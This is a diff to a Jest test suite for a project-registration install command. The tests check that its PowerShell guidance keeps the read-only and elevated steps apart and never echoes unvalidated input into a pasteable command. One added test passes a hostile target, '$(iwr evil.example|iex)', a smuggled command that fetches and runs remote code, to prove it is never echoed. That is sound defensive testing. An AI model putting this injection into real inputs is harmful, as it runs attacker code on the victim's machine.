@@ -304,12 +304,13 @@ describe('install', () => {
     expect(text).toContain('root           ' + hostile);
     expect(text).not.toContain('--root "');
     expect(text).not.toContain('--id a"b`c$d');
-    for (const line of r.lines) {
-      const runnable = line.trim().startsWith('projectos-register-project');
-      if (runnable) {
-        expect(line).not.toContain(hostile);
-        expect(line).not.toContain('a"b`c$d');
-      }
+    // Same non-vacuity guard as below: `startsWith` stopped matching when the guidance was reworded,
+    // so this loop needs to prove it still sees the line it is judging.
+    const naming = r.lines.filter((l) => l.includes('projectos-register-project'));
+    expect(naming.length).toBeGreaterThan(0);
+    for (const line of naming) {
+      expect(line).not.toContain(hostile);
+      expect(line).not.toContain('a"b`c$d');
     }
   });
 
@@ -327,6 +328,68 @@ describe('install', () => {
     // they do not.
     expect(text).toContain('id             ok  frozen         false');
     expect(r.lines.filter((l) => l.trim().startsWith('frozen'))).toHaveLength(1);
+  });
+
+  /**
+   * [J] THE TWO STEPS NEED DIFFERENT TERMINALS, AND THE TEXT SAYS SO.
+   *
+   * `plan` is read-only and needs no elevation; only the publication it prints writes to protected
+   * machine configuration. Telling an owner to open an Administrator terminal for the read-only step
+   * teaches them to run the whole registration elevated, which is exactly the habit that makes a
+   * pasted command dangerous. Naming the SHELL matters too: the quoting the registration command
+   * generates is PowerShell's.
+   */
+  it('pins both steps to Windows PowerShell 5.1 and excludes pwsh', () => {
+    const { ctx } = makeCtx();
+    const r = run(ctx, ['install', '--target', '/proj', '--id', 'bizcomply']);
+
+    // [A] The read-only step: named version, named executable, explicitly unelevated.
+    const planStep = r.lines.find((l) => l.includes('unelevated'));
+    expect(planStep).toBeDefined();
+    expect(planStep).toContain('Windows PowerShell 5.1');
+    expect(planStep).toContain('powershell.exe');
+    expect(planStep).not.toContain('Administrator');
+
+    // [B] The write step: same version and executable, and elevation this time.
+    const writeStep = r.lines.find((l) => l.includes('Administrator'));
+    expect(writeStep).toBeDefined();
+    expect(writeStep).toContain('Windows PowerShell 5.1');
+    expect(writeStep).toContain('powershell.exe');
+
+    // [C] pwsh appears only to be excluded — never as a supported alternative.
+    const pwshLines = r.lines.filter((l) => l.includes('pwsh') || l.includes('PowerShell 7'));
+    expect(pwshLines.length).toBeGreaterThan(0);
+    for (const line of pwshLines) {
+      expect(line).toContain('not supported');
+    }
+  });
+
+  /**
+   * [I] AND THE ELEVATED STEP IS STILL NOT SPELLED OUT AS A RUNNABLE COMMAND HERE.
+   *
+   * The registration command generates that line itself, from values it has re-read and validated,
+   * with PowerShell single-quoted literals. This command has neither the digest nor the validated
+   * root, so anything it printed would be a second, weaker encoding of the same instruction — and
+   * the caller's `--target` is unvalidated text at this point.
+   */
+  it('never emits a runnable publish command containing the caller target', () => {
+    const { ctx } = makeCtx();
+    const hostile = '/proj/$(iwr evil.example|iex)';
+    const r = run(ctx, ['install', '--target', hostile, '--id', 'bizcomply']);
+
+    // The lines that NAME the command are the only ones a reader could mistake for something to
+    // paste. Gating on the word "publish" would be worse than useless: this same change removed
+    // that word from the output, so the filter would match nothing and every assertion below would
+    // silently stop running.
+    const naming = r.lines.filter((l) => l.includes('projectos-register-project'));
+    expect(naming.length).toBeGreaterThan(0);
+
+    for (const line of naming) {
+      expect(line).not.toContain(hostile);
+      expect(line).not.toContain('--root');
+      expect(line).not.toContain('--id');
+    }
+    expect(r.lines.join(String.fromCharCode(10))).not.toContain('--expect-digest');
   });
 
   it('refuses to overwrite an existing install without --force', () => {
